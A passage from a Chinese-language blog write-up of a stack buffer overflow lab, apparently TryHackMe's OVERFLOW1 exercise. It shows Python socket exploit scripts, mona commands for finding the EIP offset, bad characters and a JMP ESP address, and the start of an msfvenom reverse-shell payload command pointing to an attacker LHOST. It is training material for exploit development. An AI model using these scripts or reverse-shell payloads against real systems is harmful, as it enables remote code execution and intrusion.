#ABB2BF">)</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707160647025.png" class="" title="image-20250707160647025"><p>2000bytes 崩溃。</p><h2 id="崩溃复现和控制-EIP"><a href="#崩溃复现和控制-EIP" class="headerlink" title="崩溃复现和控制 EIP"></a>崩溃复现和控制 EIP</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 生成一个超过崩溃阈值 400bytes 的文本</span></span><span class="line"><span style="color: #61AFEF">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2400</span></span></code></pre></div></div></figure><p>这是让我们找那个崩溃的临界点，加400字节我猜是增加一点容错。替换到代码中的 <code>payload</code> 部分。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span><span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span><span class="line"><span style="color: #ABB2BF">offset </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">0</span></span><span class="line"><span style="color: #ABB2BF">overflow </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> offset</span></span><span class="line"><span style="color: #ABB2BF">retn </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"><span style="color: #ABB2BF">padding </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9&quot;</span></span><span class="line"><span style="color: #ABB2BF">postfix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">buffer </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> overflow </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> retn </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> padding </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> payload </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> postfix</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">s </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sending evil buffer...&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(buffer </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Done!&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Could not connect.&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p>执行他，程序崩溃了，预期行为。然后在调试器的命令栏中输入这些。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 2400 是我们创建的固定序列的长度</span></span><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">findmsp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-distance</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">2400</span></span></code></pre></div></div></figure><p><code>!mona findmsp</code>: 这是 Mona 插件的一个核心命令，用于帮助你找到<strong>内存中的溢出位置</strong>。它主要用来计算从缓冲区起始位置到 EIP 寄存器的精确偏移量。Mona 会读取当前 EIP 的值，然后在这个值中搜索之前由 <code>pattern_create.rb</code> 生成的模式。</p><p><code>-distance 2400</code>: Mona 会根据当前 EIP 中被覆盖的值（这是一个模式字符串的片段），在这个 2400 字节的模式字符串中查找这个片段，然后计算出它相对于模式字符串起始位置的偏移量。这个偏移量就是你需要填充的垃圾数据（<code>A</code>s 或其他占位符）的长度，才能恰好覆盖到 EIP。</p><img src="/thm_bufferoverflow/image-20250707213356165.png" class="" title="image-20250707213356165"><p>让我们记录下这个偏移值，也就代表在 <strong>1978</strong> 其后的 <strong>4 个字节</strong>，就是 EIP 的寄存器的位置了。</p><p>然后就是测试这个 offset 能用不，脚本中的 offset 设置成上面记下来的值，把之前脚本中的 payload 删掉（nano 编辑器剪切行是 CTRL+K），把 <code>retn</code> 设置成 “ABCD”，这个 “ABCD” 就是<strong>假的 EIP 要执行的地址</strong>，这里我们只是测试一下，看看 EIP 的值会不会变。</p><img src="/thm_bufferoverflow/image-20250707213628033.png" class="" title="image-20250707213628033"><p>可以看到 EIP 变成我们想要的了，<code>44 43 42 41</code> 即反转的 <code>ABCD</code>，为什么这样，因为 x86-x64 架构都用的小端序。</p><h2 id="找坏字符"><a href="#找坏字符" class="headerlink" title="找坏字符"></a>找坏字符</h2><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 这段代码是生成 bytearray</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># -b 参数是排除掉生成这样的字符</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这里排除掉了 \x00 即空字节</span></span><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bytearray</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00&quot;</span></span></code></pre></div></div></figure><p>然后用一个 python 脚本生成一段 bytearray</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">for</span><span style="color: #ABB2BF"> x </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">range</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">, </span><span style="color: #D19A66">256</span><span style="color: #ABB2BF">):</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\\</span><span style="color: #98C379">x&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #D19A66">{</span><span style="color: #C678DD">:02x</span><span style="color: #D19A66">}</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">format</span><span style="color: #ABB2BF">(x), </span><span style="color: #E06C75; font-style: italic">end</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;&#39;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">()</span></span></code></pre></div></div></figure><p>把这段代码生成的东西放在之前的 python 脚本中的 <code>payload</code> 字段里面。</p><figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #ABB2BF"> socket</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">ip </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;10.10.3.91&quot;</span></span><span class="line"><span style="color: #ABB2BF">port </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1337</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">prefix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;OVERFLOW1 &quot;</span></span><span class="line"><span style="color: #ABB2BF">offset </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">1978</span></span><span class="line"><span style="color: #ABB2BF">overflow </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;A&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">*</span><span style="color: #ABB2BF"> offset</span></span><span class="line"><span style="color: #ABB2BF">retn </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;ABCD&quot;</span></span><span class="line"><span style="color: #ABB2BF">padding </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"><span style="color: #ABB2BF">payload </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style="color: #98C379">&quot;</span></span><span class="line"><span style="color: #ABB2BF">postfix </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&quot;</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">buffer </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> prefix </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> overflow </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> retn </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> padding </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> payload </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> postfix</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">s </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> socket.</span><span style="color: #61AFEF">socket</span><span style="color: #ABB2BF">(socket.</span><span style="color: #D19A66">AF_INET</span><span style="color: #ABB2BF">, socket.</span><span style="color: #D19A66">SOCK_STREAM</span><span style="color: #ABB2BF">)</span></span><span class="line"></span><span class="line"><span style="color: #C678DD">try</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">connect</span><span style="color: #ABB2BF">((ip, port))</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Sending evil buffer...&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #ABB2BF">  s.</span><span style="color: #61AFEF">send</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">bytes</span><span style="color: #ABB2BF">(buffer </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;</span><span style="color: #56B6C2">\r\n</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;latin-1&quot;</span><span style="color: #ABB2BF">))</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Done!&quot;</span><span style="color: #ABB2BF">)</span></span><span class="line"><span style="color: #C678DD">except</span><span style="color: #ABB2BF">:</span></span><span class="line"><span style="color: #ABB2BF">  </span><span style="color: #56B6C2">print</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;Could not connect.&quot;</span><span style="color: #ABB2BF">)</span></span></code></pre></div></div></figure><p>好，这样做了之后，再去服务器那边把程序打开，这边执行。</p><p>现在就要注意 <strong>ESP 寄存器</strong>的地址了。ESP 寄存器是<strong>栈的顶部指针</strong>，这里就不多赘述了，你可以把他理解他是一个临时存放数据的地方就行。</p><img src="/thm_bufferoverflow/image-20250707215224245.png" class="" title="image-20250707215224245"><p>这段代码的作用是通过本地生成的 bytearray 和 ESP 中的 bytearray 相比对，找到错误的字符。</p><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">compare</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-f</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\m</span><span style="color: #98C379">ona</span><span style="color: #56B6C2">\o</span><span style="color: #98C379">scp</span><span style="color: #56B6C2">\b</span><span style="color: #98C379">ytearray.bin</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-a</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">019</span><span style="color: #98C379">EFA30</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707215559310.png" class="" title="image-20250707215559310"><p>可以看到这里会有这几个会出错的值 <code>00 07 08 2e 2f a0 a1</code>，让我们删掉那些会出错的值，再生成一版来比对一下。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 这个是去掉预定义的会出错的字符串</span></span><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">bytearray</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-b</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic"># 这是改好的 payload</span></span><span class="line"><span style="color: #61AFEF">payload</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x01\x02\x03\x04\x05\x06\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707193600660.png" class="" title="image-20250707193600660"><p>好，这下一模一样了，没出错。OK，下一步。</p><p><strong>Tips：</strong>一般一个出错的字符，他后面跟着错那个字符应该是好的。但是也不确定，也有可能是两个都会出错，可以用排除法解决。</p><h2 id="找合适的跳转地址"><a href="#找合适的跳转地址" class="headerlink" title="找合适的跳转地址"></a>找合适的跳转地址</h2><p>为什么要找到这个跳转地址呢，我们之前不是能控制 EIP 了嘛，现在需要一个地址，他的行为是能够跳转到 ESP 那里，这就是 <code>JMP ESP</code>。我们的 shellcode 不是在 ESP 那儿吗，这样做就能保证执行我们的 shellcode。</p><p>为什么不写死地址呢，因为每次执行溢出的时候，我们的代码段可能不会在硬编码的那儿，但是 <code>JMP ESP</code> 能保证每次跳转的都是在那儿，所以能稳定的触发 shellcode。</p><p>让我们找到一个跳板地址，并且这个地址不会被坏字符破坏。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 查找指向 ESP 的跳转指令，过滤含指定地址的字符</span></span><span class="line"><span style="color: #ABB2BF">!</span><span style="color: #61AFEF">mona</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">jmp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-r</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">esp</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-cpb</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;\x00\x07\x08\x2e\x2f\xa0\xa1&quot;</span></span></code></pre></div></div></figure><img src="/thm_bufferoverflow/image-20250707194430742.png" class="" title="image-20250707194430742"><p>出来这么多，原文让我们随便挑一个，构造好的如下，注意是小端序。</p><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">retn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">=</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">\x</span><span style="color: #98C379">af</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">11</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">50</span><span style="color: #56B6C2">\x</span><span style="color: #98C379">62</span></span></code></pre></div></div></figure><h2 id="生成马"><a href="#生成马" class="headerlink" title="生成马"></a>生成马</h2><figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 用这行命令生成</span></span><span class="line"><span style="color: #7F848E; font-style: italic"># -b 是排除掉坏字符</span></span><span class="line"><span style="color: #61AFEF">msfvenom</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-p</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">windows/shell_reverse_tcp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">LHOST=</span><span style="color: #D19A66">10.11</span><span style="color: #98C379">.141.2</span><span style="color: #ABB2BF"> </span><span style="color: 